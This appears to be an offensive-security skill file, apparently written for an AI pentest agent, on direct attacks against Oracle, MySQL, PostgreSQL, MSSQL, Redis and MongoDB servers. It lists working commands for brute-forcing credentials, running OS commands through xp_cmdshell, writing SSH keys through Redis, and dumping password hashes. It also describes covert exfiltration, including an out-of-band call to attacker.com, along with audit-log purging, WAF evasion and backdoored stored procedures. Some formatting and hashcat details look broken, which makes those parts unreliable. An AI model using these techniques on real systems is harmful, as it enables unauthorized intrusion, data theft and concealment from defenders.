# database-attack

# Database Attack

> **Supplementary Files**:
> - `payloads.md` — Attack payloads organized by database type: Oracle, MySQL/MariaDB, PostgreSQL, MSSQL/Sybase, Redis, MongoDB, and multi-protocol brute force
> - `test-cases.md` — Structured test case templates (8 cases covering enumeration, exploitation, brute-force, and post-exploitation across 6 database types)
> - `guides/oracle-database-attack.md` — Oracle database attack deep dive: TNS listener, odat exploitation, privilege escalation
> - `guides/redis-mongodb-unauth.md` — Redis and MongoDB unauthenticated access, misconfiguration exploitation, and data exfiltration
> - `guides/database-bruteforce.md` — Database protocol brute-forcing with hydra, ncrack, and patator

## Summary

This skill targets database listeners, authentication mechanisms, stored procedures, and protocol-level misconfigurations.

**Tools**: odat, oscanner, sqsh, redis-tools, mongoaudit, patator, ncrack, hydra

**Domain**: database

**MITRE ATT&CK**: TA0006-Credential Access

## Description

Direct attacks against database servers at the protocol level — distinct from web-based SQL injection (covered by web-sqli). This skill targets database listeners, authentication mechanisms, stored procedures, and protocol-level misconfigurations. Covers Oracle TNS, MySQL, PostgreSQL, MSSQL/Sybase, Redis, and MongoDB.

While web-sqli exploits application-layer vulnerabilities to inject SQL through HTTP, this skill attacks the database server directly: brute-forcing credentials over the wire, exploiting default configurations, abusing stored procedures for OS command execution, and exfiltrating data through native database protocols.

## Use Cases

1. **Database server enumeration** — Discover database listeners on the network, fingerprint DBMS type and version, identify running services and configuration weaknesses
2. **Authentication brute-force** — Test database credentials against Oracle TNS, MySQL, PostgreSQL, MSSQL, and other database protocols using targeted wordlists
3. **Oracle exploitation** — Exploit Oracle TNS listener misconfigurations, leverage odat for SID enumeration, credential extraction, file read/write, and OS command execution
4. **NoSQL misconfiguration abuse** — Exploit unauthenticated Redis and MongoDB instances, read/write files, execute Lua scripts, exfiltrate data
5. **MSSQL post-authentication exploitation** — Leverage xp_cmdshell and stored procedures for OS command execution after gaining database credentials
6. **PostgreSQL privilege escalation** — Exploit misconfigured roles, abuse COPY/lo_import for file access, leverage PL/Python or PL/Perl for code execution

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **odat** | Oracle database attack toolkit — SID guessing, credential brute-force, file read/write, OS command exec | `odat all -s 192.168.1.100 -d ORCL` |
| **oscanner** | Oracle TNS listener scanning and enumeration | `oscanner -s 192.168.1.100` |
| **sqsh** | Sybase/MSSQL interactive shell with command pipelining | `sqsh -S 192.168.1.100 -U sa -P ''` |
| **redis-tools** | Redis CLI client for unauthenticated access and exploitation | `redis-cli -h 192.168.1.100 INFO` |
| **mongoaudit** | MongoDB security auditing tool for misconfiguration detection | `mongoaudit -h 192.168.1.100 -p 27017` |
| **patator** | Multi-protocol brute-forcer with modular design | `patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1` |
| **ncrack** | High-speed network authentication cracking (SSH/RDP/database protocols) | `ncrack -p 3306 192.168.1.100 -u root -P passwords.txt` |
| **hydra** | Online brute-force supporting 50+ protocols including database modules | `hydra -l root -P passwords.txt mysql://192.168.1.100` |

## Methodology

### Attack Chain

```
Recon & Discovery → Service Enumeration → Authentication Testing → Exploitation → Post-Exploitation
   (nmap/oscanner)    (odat/SID guess)     (hydra/ncrack/patator)   (odat/sqsh)     (xp_cmdshell/file ops)
```

**Phase 1: Recon and Discovery**

- Port scan common database ports: Oracle (1521), MySQL (3306), PostgreSQL (5432), MSSQL (1433), Redis (6379), MongoDB (27017)
- Identify database type and version via banner grabbing or protocol probing
- Detect default or misconfigured instances (empty passwords, anonymous access)

**Phase 2: Service Enumeration**

- Oracle: enumerate SIDs with odat, scan TNS listener with oscanner, identify valid database names
- MSSQL/Sybase: enumerate databases and server properties with sqsh
- Redis: test unauthenticated access with redis-cli, enumerate keys and configuration
- MongoDB: test unauthenticated access, enumerate databases and collections with mongoaudit

**Phase 3: Authentication Testing**

- Brute-force database credentials with hydra, ncrack, or patator
- Test default credentials: Oracle (sys/change_on_install), MySQL (root/empty), MSSQL (sa/empty), PostgreSQL (postgres/postgres)
- Use database-specific wordlists and username patterns (dba, admin, backup, replication)

**Phase 4: Exploitation**

- Oracle: exploit with odat — read/write files via UTL_FILE, execute OS commands via DBMS_SCHEDULER, extract credentials from DB links
- MSSQL: enable and use xp_cmdshell for OS command execution, extract hashes from sys.sql_logins
- PostgreSQL: abuse COPY for file read, exploit PL/Python/PL/Perl for code execution, use lo_import for binary file access
- Redis: write SSH authorized_keys or web shells via CONFIG SET dir/dbfilename, load malicious modules
- MongoDB: exploit NoSQL injection, abuse eval/MapReduce for code execution

**Phase 5: Post-Exploitation**

- Extract all credentials and hashes from database system tables
- Pivot to other database instances using discovered DB links or replication credentials
- Establish persistence via database jobs, triggers, or stored procedures
- Cover tracks by purging audit logs and database logs

## Practical Steps

> **See payloads.md for detailed commands, and test-cases.md for complete test checklists.** Below is a summary of core operations at each stage.

### Step 1: Discover and Fingerprint Database Services

```bash
# Scan common database ports
nmap -sV -p 1521,3306,5432,1433,6379,27017 192.168.1.0/24

# Oracle-specific scan with oscanner
oscanner -s 192.168.1.100

# Quick Redis unauthenticated access test
redis-cli -h 192.168.1.100 INFO server

# MongoDB connection test
mongo --host 192.168.1.100 --port 27017 --eval "db.adminCommand('listDatabases')"
```

### Step 2: Enumerate and Test Authentication

```bash
# Oracle SID enumeration with odat
odat sidguesser -s 192.168.1.100 -p 1521

# Oracle password brute-force
odat passwordguesser -s 192.168.1.100 -d ORCL

# MySQL brute-force with hydra
hydra -L users.txt -P passwords.txt mysql://192.168.1.100

# MSSQL connection test with sqsh (empty sa password)
sqsh -S 192.168.1.100 -U sa -P '' -C "SELECT @@version"
```

### Step 3: Exploit and Escalate

```bash
# Oracle full exploitation with odat
odat all -s 192.168.1.100 -d ORCL -U sys -P change_on_install

# MSSQL OS command execution via xp_cmdshell
sqsh -S 192.168.1.100 -U sa -P password -C "xp_cmdshell 'whoami'"

# Redis write SSH authorized_keys
redis-cli -h 192.168.1.100 CONFIG SET dir /root/.ssh
redis-cli -h 192.168.1.100 CONFIG SET dbfilename authorized_keys
```

# MySQL credential extraction
mysql -u root -e "SELECT user, host, authentication_string FROM mysql.user"

# PostgreSQL credential extraction
psql -U postgres -c "SELECT rolname, rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL"

# MSSQL credential extraction
sqsh -S target -U sa -C "SELECT name, password_hash FROM sys.sql_logins"

# Oracle credential extraction via odat
odat passwordstealer -s 192.168.1.100 -d ORCL -U sys -P password
```

**Cracking Database Hashes**:
- MySQL 5.x+: hashcat mode 300 (SHA1), mode 3000 (LM)
- MSSQL 2012+: hashcat mode 1731 (SHA-512)
- PostgreSQL MD5: hashcat mode 11 (or custom mode with `md5` prefix)
- Oracle 11g+: hashcat mode 112 (Oracle 11g)

## Data Exfiltration Techniques

Extracting data from compromised databases requires different approaches depending on the database type, available privileges, and network restrictions:

**Bulk Export Tools**: Use native database export tools for maximum efficiency — `mysqldump` for MySQL, `pg_dump` for PostgreSQL, `mongoexport`/`mongodump` for MongoDB, `expdp` for Oracle. These tools handle character encoding, binary data, and schema relationships automatically.

**Targeted Extraction**: When bulk export is too noisy or time-consuming, extract specific high-value data: user tables, credit card columns, PII fields, authentication tokens. Use `SELECT INTO OUTFILE` (MySQL), `COPY TO` (PostgreSQL), or scripted extraction through query interfaces.

**Covert Exfiltration Channels**: When network monitoring blocks direct data transfer, use covert channels: encoding data into DNS queries via stored procedures, writing data to files accessible through web servers, using database replication to copy data to attacker-controlled replicas, or leveraging database backup mechanisms to exfiltrate through scheduled backup jobs.

**Anti-Forensic Considerations**: Minimize audit trail by understanding what the target database logs: MySQL general_log and slow_query_log, PostgreSQL pg_stat_activity and custom audit extensions, Oracle unified auditing, MSSQL SQL Server Audit. Avoid SELECT * in favor of targeted column extraction to reduce log verbosity.

## Defense Evasion Techniques

### SQL Injection Stealth
- **Time-based blind**: `IF(condition, SLEEP(5), 0)` — extract via timing without output.
- **Out-of-band exfil**: `LOAD_FILE('\\\\ attacker.com\\x')` (MySQL); `xp_dirtree` (MSSQL) for DNS exfil.
- **Distributed queries**: Spread SQLi attempts across many sessions; below rate threshold.
- **Encoding tricks**: Hex (`0x`), char(), URL encoding to evade WAF.

### Query Stealth
- **Use indexed columns**: Avoid full table scans that trigger audit alerts.
- **Limit results**: `LIMIT 100` per query; below bulk export threshold.
- **Off-hours queries**: Run during low-activity windows.
- **Reuse legitimate connections**: Don't create new DB connections; use connection pool.

### Lateral Movement Stealth
- **Linked servers** (SQL Server): Use `sp_addlinkedserver` for cross-DB access; appears as legitimate config.
- **PL/SQL packages** (Oracle): Use legitimate packages (UTL_HTTP, DBMS_LDAP) for outbound.
- **CLR assembly** (SQL Server): Load malicious .NET assembly; persists across reboots.
- **Stored procedure persistence**: Backdoor stored procedure; activates on specific trigger.
